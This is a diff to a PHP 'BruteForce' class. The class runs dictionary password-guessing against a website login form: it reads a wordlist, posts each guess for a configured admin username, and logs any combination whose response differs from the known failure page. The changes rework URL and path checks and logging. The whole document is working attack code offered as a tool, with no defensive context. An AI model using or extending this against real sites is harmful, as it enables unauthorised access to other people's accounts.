@@ -25,15 +25,6 @@ class BruteForce
 	*/
 	protected static $data = array();
 
-	/*
-	* @param {boolean} validate
-	*/
-	protected static $validate = false;
-
-	/*
-	* @param {boolean} checked
-	*/
-	protected static $checked = false;
 
 
 
@@ -79,37 +70,20 @@ class BruteForce
 		date_default_timezone_set(self::$settings['timezone']);
 		$date = date('m/d/Y h:i:s a', time());
 
-		file_put_contents(self::$settings['outputfile'],"[{$date}] Server: " .  $data . "\n", FILE_APPEND);
-	}
-
-	public function checkPath($path)
-	{
-		if( $this->checkURL($url) )
+		if(file_put_contents(self::$settings['outputfile'],"[{$date}] Server: " .  $data . "\n", FILE_APPEND))
 		{
-			$headers = @get_headers($path);
-
-			if($headers[0] == 'HTTP/1.1 404 Not Found')
-			{
-				self::$checked = true;
-				self::$validate = false;
-				return false;
-			}
-			else
-			{
-				self::$checked = true;
-				self::$validate = true;
-				return true;
-			}
+			return true;
 		}
 		else
 		{
-			self::$checked = true;
-			self::$validate = false;
 			return false;
 		}
-
 	}
 
+	/*
+	* @param {string} url
+	* @param {boolean} mode
+	*/
 	public function checkURL($url, $mode = true)
 	{
 		if( !filter_var( $url, FILTER_VALIDATE_URL ) )
@@ -119,14 +93,13 @@ class BruteForce
 				$this->logAttack('Failed to filter ' . $url . ' as a valid URL.');
 			}
 
-			self::$checked = true;
-			self::$validate = false;
 			return false;
 		}
 
 		$this->curl = curl_init( $url );
 		curl_setopt( $this->curl, CURLOPT_CONNECTTIMEOUT, 10 );
 		curl_setopt( $this->curl, CURLOPT_NOBODY, true );
+		curl_setopt( $this->curl, CURLOPT_HEADER, true );
 		curl_setopt( $this->curl, CURLOPT_RETURNTRANSFER, true );
 
 		$resp = curl_exec( $this->curl );
@@ -141,30 +114,61 @@ class BruteForce
 			{
 				$this->logAttack($url . ' is not a valid URL, can\'t connect.');
 			}
-			self::$checked = true;
-			self::$validate = false;
 			return false;
 		}
 
 
 	}
 
-	public function attack()
+	/*
+	* @param {string} url
+	* @param {boolean} mode
+	*/
+	public function checkPath($url, $mode = true)
 	{
-		if(self::$validate === false && self::$checked === false)
-		{
-			if ( !$this->checkURL(self::$settings['url']) )
+		$this->curl = curl_init( $url );
+
+		curl_setopt( $this->curl, CURLOPT_RETURNTRANSFER, true );
+
+		$resp = curl_exec( $this->curl );
+
+		$code = curl_getinfo($this->curl, CURLINFO_HTTP_CODE);
+		if($code == 404) {
+			if($mode)
 			{
-				return "Something isn't validate. Check your output file.";
-				return false;
+				$this->logAttack($url . ' is not found on the website (404).');
 			}
-		} 
-		elseif(self::$validate === false && self::$checked === true)
+		    return false;
+		}
+		elseif($code == 403)
 		{
-			return "Something isn't validate. Check your output file.";
+			if($mode)
+			{
+				$this->logAttack($url . 'is a forbidden page on the website (403)');
+			}
 			return false;
 		}
+		else
+		{
+			return true;
+		}
 
+		curl_close($this->curl);
+
+	}
+
+	public function attack()
+	{
+		if(!$this->checkURL(self::$settings['url']))
+		{
+			return 'Can\'t connect to ' . self::$settings['url'] . '. Check the output file (' . self::$settings['outputfile'] . ')';
+		}
+		if(!$this->checkPath(self::$settings['url']))
+		{
+			return 'Can\'t connect to ' . self::$settings['url'] . '. Check the output file (' . self::$settings['outputfile'] . ')';
+		}
+		
+		
 		foreach( $this->scanFile() as $l => $f)
 		{
 			self::$data[self::$settings['username']] = self::$settings['adminname'];
@@ -178,8 +182,8 @@ class BruteForce
 
 			if (curl_exec( $this->curl ) != self::$settings['failcontent'])
 			{
+				if($this->logAttack('Found a matching combination (' . self::$settings['adminname'] . ':' . $f .') in line ' . $l . ' of ' . self::$settings['wordlist'] ));
 				return "Found a combo. Check the output log.";
-				$this->logAttack('Found a matching combination (' . self::$settings['adminname'] . ':' . $f .') in line ' . $l . ' of ' . self::$settings['wordlist'] );
 			} 
 			
 		}	
